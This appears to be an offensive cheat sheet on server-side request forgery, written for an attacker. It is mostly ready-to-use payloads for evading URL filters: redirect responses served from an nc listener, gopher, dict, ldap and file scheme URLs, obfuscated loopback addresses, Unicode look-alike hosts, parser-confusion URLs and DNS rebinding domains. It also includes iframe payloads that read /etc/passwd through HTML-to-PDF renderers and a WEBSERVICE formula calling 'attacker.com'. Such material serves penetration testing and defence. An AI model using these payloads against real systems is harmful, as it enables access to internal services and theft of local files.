Server-side request forgery (or SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.

In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems.

# Bypass filters

Applications often block input containing non-whitelist hostnames, sensitive URLs, or IP addresses like loopback, IPv4 link-local, [private addresses](https://tools.ietf.org/html/rfc1918), etc. In this situation, it is sometimes possible to bypass the filter using various techniques.

## Redirection 

You can try using a redirection to the desired URL to bypass the filter. To do this, return a response with the `3xx` code and the desired URL in the `Location` header to the request from the vulnerable server, for example:

```http
HTTP/1.1 301 Moved Permanently
Server: nginx
Connection: close
Content-Length: 0
Location: http://127.0.0.1
```

You can achieve redirection in the following ways:
- bash, like `nc -lvp 80 < response.txt`
- URL shortener services
- Mock and webhook services, see [here](/Resources/Researching/web-application.md#mocks-&-webhooks)
- More flexible solutions such as a simple HTTP server on python

Also, if the application contains an open redirection vulnerability you can use it to bypass the URL filter, for example:

```http
POST /api/v1/webhook HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 101

url=https://vulnerable-website.com/api/v1/project/next?currentProjectId=1929851&path=http://127.0.0.1
```

These bypass approaches work because the application only validates the provided URL, which triggers the redirect. It follows the redirect and makes a request to the internal URL of the attacker's choice.

## URL scheme

You can try to use different URL schemes:

```bash
file://path/to/file
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
dict://127.0.0.1:1337/stats
ftp://127.0.0.1/
sftp://attacker-website.com:1337/
tftp://attacker-website.com:1337/TESTUDPPACKET
ldap://127.0.0.1:389/%0astats%0aquit
ldaps://127.0.0.1:389/%0astats%0aquit
ldapi://127.0.0.1:389/%0astats%0aquit
gopher://attacker-website.com/_SSRF%0ATest!
```

### Node.js

Node.js for Windows considers any single letter in a URL scheme as `drive://filepath` and set the protocol to `file://`.

```javascript
// Node.js (Windows only)
// the following row will return `file:`
new URL('l://file').protocol
```

References:
- [@PwnFunction tweet](https://twitter.com/PwnFunction/status/1484510976183443464)

### Java

Java's URL will correctly handle the next URLs:

```bash
url:file:///etc/passwd
url:http://127.0.0.1:8080
```

References:
- `@phithon_xg` tweets [1](https://twitter.com/phithon_xg/status/1499414715033735169) and [2](https://twitter.com/phithon_xg/status/1498153253350961152)

## IP address formats

You can try using a different IP address format to bypass the filter.

### Rare IP address

Rare IP address formats, defined in [RFC 3986](https://tools.ietf.org/html/rfc3986#section-7.4):
- Dotted hexadecimal IP: `0x7f.0x0.0x0.0x1`
- Dotless hexadecimal IP: `0x7f001`
- Dotless hexadecimal IP with padding: `0x0a0b0c0d7f000001` (padding is `0a0b0c0d`)
- Dotless decimal IP: `2130706433`
- Dotted decimal IP with overflow (256): `383.256.256.257`
- Dotted octal IP: `0177.0.0.01`
- Dotless octal IP: `017700000001`
- Dotted octal IP with padding: `00177.000.0000.000001`
- Combined:

    ```http
    0x7f.0.1
    0x7f.1
    00177.1
    00177.0x0.1
    ```

You can short-hand IP addresses by dropping the zeros:

```http
1 part  (ping A)       : 0.0.0.A
2 parts (ping A.B)     : A.0.0.B
3 parts (ping A.B.C)   : A.B.0.C
4 parts (ping A.B.C.D) : A.B.C.D

0       => 0.0.0.0
127.1   => 127.0.0.1
127.0.1 => 127.0.0.1
```

### IPv6 address

- IPv6 localhost:

    ```http
    [::]
    0000::1
    [::1]
    0:0:0:0:0:0:0:0
    ```

- IPv4-mapped IPv6 address: `[::ffff:7f00:1]`
- IPv4-mapped IPv6 address: `[::ffff:127.0.0.1]`
- IPv4-compatible IPv6 address (deprecated, q.v. [RFC4291](https://tools.ietf.org/html/rfc4291#section-2.5.5.1): `[::127.0.0.1]`
- IPv4-mapped IPv6 address with [zone identifier](https://tools.ietf.org/html/rfc6874): `[::ffff:7f00:1%25]`
- IPv4-mapped IPv6 address with [zone identifier](https://tools.ietf.org/html/rfc6874): `[::ffff:127.0.0.1%eth0]`

### Abuse of enclosed alphanumerics

Enclosed alphanumerics is a Unicode block of typographical symbols of an alphanumeric within a circle, a bracket or other not-closed enclosure, or ending in a full stop, q.v. [list](https://jrgraphix.net/r/Unicode/2460-24FF).

```http
127。0。0。1
127｡0｡0｡1
127．0．0．1
⑫７｡⓪．𝟢。𝟷
𝟘𝖃𝟕𝒇｡𝟘𝔵𝟢｡𝟢𝙭⓪｡𝟘𝙓¹
⁰𝔁𝟳𝙛𝟢０１
２𝟏𝟑𝟢𝟕𝟢６𝟺𝟛𝟑
𝟥𝟪³。𝟚⁵𝟞。²₅𝟞。²𝟧𝟟
𝟢₁𝟳₇｡０｡０｡𝟢𝟷
𝟎𝟢𝟙⑦⁷。０００。𝟶𝟬𝟢𝟘。𝟎₀𝟎𝟢０𝟣
[::𝟏②₇．𝟘．₀．𝟷]
[::𝟭２𝟟｡⓪｡₀｡𝟣%𝟸𝟭⑤]
[::𝚏𝕱ᶠ𝕗:𝟏₂７｡₀｡𝟢｡①]
[::𝒇ℱ𝔣𝐹:𝟣𝟤７。₀。０。₁%②¹𝟧]
𝟎𝚇𝟕𝖋｡⓪｡𝟣
𝟎ˣ𝟩𝘍｡𝟷
𝟘𝟘①𝟕⑦．１
⓪𝟘𝟙𝟳𝟽｡𝟎𝓧₀｡𝟏
```

## Abusing a bug in Ruby's native resolver

`Resolv::getaddresses` is OS-dependent, therefore by playing around with different IP formats one can return blank values. 

Proof of concept:

```ruby
irb(main):001:0> require 'resolv'
=> true
irb(main):002:0> uri = "0x7f.1"
=> "0x7f.1"
irb(main):003:0> server_ips = Resolv.getaddresses(uri)
=> [] # The bug!
irb(main):004:0> blocked_ips = ["127.0.0.1", "::1", "0.0.0.0"]
=> ["127.0.0.1", "::1", "0.0.0.0"]
irb(main):005:0> (blocked_ips & server_ips).any?
=> false # Bypass
```

References:
- [Bypassing Server-Side Request Forgery filters by abusing a bug in Ruby's native resolver](https://edoverflow.com/2017/ruby-resolv-bug/)
- [Report: Blind SSRF in "Integrations" by abusing a bug in Ruby's native resolver](https://hackerone.com/reports/287245)
- [Report: SSRF vulnerability in gitlab.com via project import](https://hackerone.com/reports/215105)

## Broken parser

The [URL specification](https://tools.ietf.org/html/rfc3986) contains a number of features that are liable to be overlooked when implementing ad hoc parsing and validation of URLs:
- Embedded credentials in a URL before the hostname, using the `@` character: `https://expected-host@evil-host`
- Indication a URL fragment using the `#` character: `https://evil-host#expected-host`
- DNS naming hierarchy: `https://expected-host.evil-host`
- URL-encode characters. This can help confuse URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
- Combinations of these techniques together:

    ```http
    foo@evil-host:80@expected-host
    foo@evil-host%20@expected-host
    evil-host%09expected-host
    127.1.1.1:80\@127.2.2.2:80
    127.1.1.1:80:\@@127.2.2.2:80
    127.1.1.1:80#\@127.2.2.2:80
    ß.evil-host
    ```

References:
- [Writeup: URL whitelist bypass in https://cxl-services.appspot.com](https://feed.bugs.xdavidhu.me/bugs/0008)
- [Writeup: Fixing the Unfixable: Story of a Google Cloud SSRF](https://bugs.xdavidhu.me/google/2021/12/31/fixing-the-unfixable-story-of-a-google-cloud-ssrf/)
- [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://github.com/0xn3va/cheat-sheets/blob/master/Web%20Application/Server%20Side%20Request%20Forgery/materials/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
- [Tool: Tiny URL Fuzzer](https://github.com/orangetw/Tiny-URL-Fuzzer)

## DNS pinning

If you want to get a A-record that resolves to an IP, use the following subdomain:

```http
make-<IP>-rr.1u.ms 
```

For example, domain resolves `make-127-0-0-1-rr.1u.ms` to `127.0.0.1`:

```bash
$ dig A make-127-0-0-1-rr.1u.ms
make-127-0-0-1-rr.1u.ms. 0	IN	A	127.0.0.1
```

Multiple records can be separated by `-and-`:

```http
make-<IP>-and-<IP>-rr.1u.ms
```

For example, domain resolves `make-127-0-0-1-and-127-127-127-127-rr.1u.ms` to `127.0.0.1` and `127.127.127.127`:

```bash
$ dig A make-127-0-0-1-and-127-127-127-127-rr.1u.ms
make-127-0-0-1-and-127-127-127-127-rr.1u.ms. 0 IN A 127.0.0.1
make-127-0-0-1-and-127-127-127-127-rr.1u.ms. 0 IN A 127.127.127.127
```

{% embed url="https://github.com/neex/1u.ms" %}

Also, check `sslip.io`:

{% embed url="https://sslip.io/" %}

## DNS rebinding

If the mechanisms in vulnerable application for checking and establishing a connection are independent and there is no caching of the DNS resolution response, you can bypass this by manipulating the DNS resolution response.

For example, if two requests go one after the other within 5 seconds, DNS resolution `make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms` will return the address `1.1.1.1` by the first request, and the second - `127.0.0.1`.

```bash
$ dig A make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms
make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms. 0 IN A 1.1.1.1

$ dig A make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms
make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms. 0 IN A 127.0.0.1
```

{% embed url="https://github.com/neex/1u.ms" %}

Also, check `lock.cmpxchg8b.com`:

{% embed url="https://lock.cmpxchg8b.com/rebinder.html" %}

# Adobe ColdFusion

{% embed url="https://hoyahaxa.blogspot.com/2021/04/ssrf-in-coldfusioncfml-tags-and.html" %}

# FFmpeg 

- [Viral Video Exploiting Ssrf In Video Converters](https://github.com/0xn3va/cheat-sheets/blob/master/Web%20Application/Server%20Side%20Request%20Forgery/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf)
- [Attacks on video converters: a year later](https://github.com/0xn3va/cheat-sheets/blob/master/Web%20Application/Server%20Side%20Request%20Forgery/materials/phdays-ffmpeg.pdf)
- [Report: SSRF and local file disclosure in https://wordpress.com/media/videos/ via FFmpeg HLS processing](https://hackerone.com/reports/237381)
- [Report: SSRF / Local file enumeration / DoS due to improper handling of certain file formats by ffmpeg](https://hackerone.com/reports/115978)
- [Tool: ffmpeg-avi-m3u-xbin](https://github.com/neex/ffmpeg-avi-m3u-xbin)

# SVG

{% embed url="https://0xn3va.gitbook.io/cheat-sheets/web-application/svg-abuse" %}

# Server-side processing of arbitrary HTML and JS 

Server-side processing of arbitrary HTML and JS data from a user can often be found when generating various documents, for example, to PDFs. If this functionality is vulnerable to HTML injection and/or XSS, you can use this to access internal resources:

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<img src onerror="document.write('<iframe src=//127.0.0.1></iframe>')">
```

Use HTTPLeaks to determine if any of the allowed HTML tags could be used to abuse the processing.

{% embed url="https://github.com/cure53/HTTPLeaks" %}

References:
- [Write up: Local File Read via XSS in Dynamically Generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
- [Write up: Exploiting HTML-to-PDF Converters through HTML Imports](https://mhmdiaa.com/blog/exploiting-html-imports/)
- [Report: Blind SSRF/XSPA on dashboard.lob.com + blind code injection](https://hackerone.com/reports/517461)
- [Report: Bypassing HTML filter in "Packing Slip Template" Lead to SSRF to Internal Kubernetes Endpoints](https://hackerone.com/reports/1115139)

# Spreadsheet exporting

If an application is running on a Windows server and exporting to a spreadsheet try to use [WEBSERVICE](https://support.microsoft.com/en-us/office/webservice-function-0546a35a-ecc6-4739-aed7-c0b7ce1562c4) function to gain a SSRF:

```
=WEBSERVICE('https://attacker.com')
```

References:
- [@intigriti tweet](https://twitter.com/intigriti/status/1500088756132589570)

# Request splitting

{% embed url="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/" %}

# HTTP headers

Many applications use in their flows IP addresses/domains, which they received directly from users in different HTTP headers, such as the `X-Forwarded-For` or `Client-IP` headers. Such application functionality can lead to a blind SSRF vulnerability if the header values are not properly validated.  

This is where the [param-miner](https://github.com/PortSwigger/param-miner) can be useful for searching the HTTP headers.

## Referer header

Also notice the `Referer` header, which is used by server-side analytics software to track visitors. Such software often logs the `Referer` header from requests, since this allows to track incoming links.

The analytics software will actually visit any third-party URL that appears in the `Referer` header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the `Referer` header often represents fruitful attack surface for SSRF vulnerabilities.

# References

- [Web Security Academy: Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
- [Blind SSRF exploitation](https://lab.wallarm.com/blind-ssrf-exploitation/)
- [PayloadsAllTheThings: Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Report: SSRF in CI after first run](https://hackerone.com/reports/369451)
- [Report: GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery](https://hackerone.com/reports/541169)
- [Report: Gitlab DNS rebinding protection bypass](https://hackerone.com/reports/632101)
- [Write up: How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
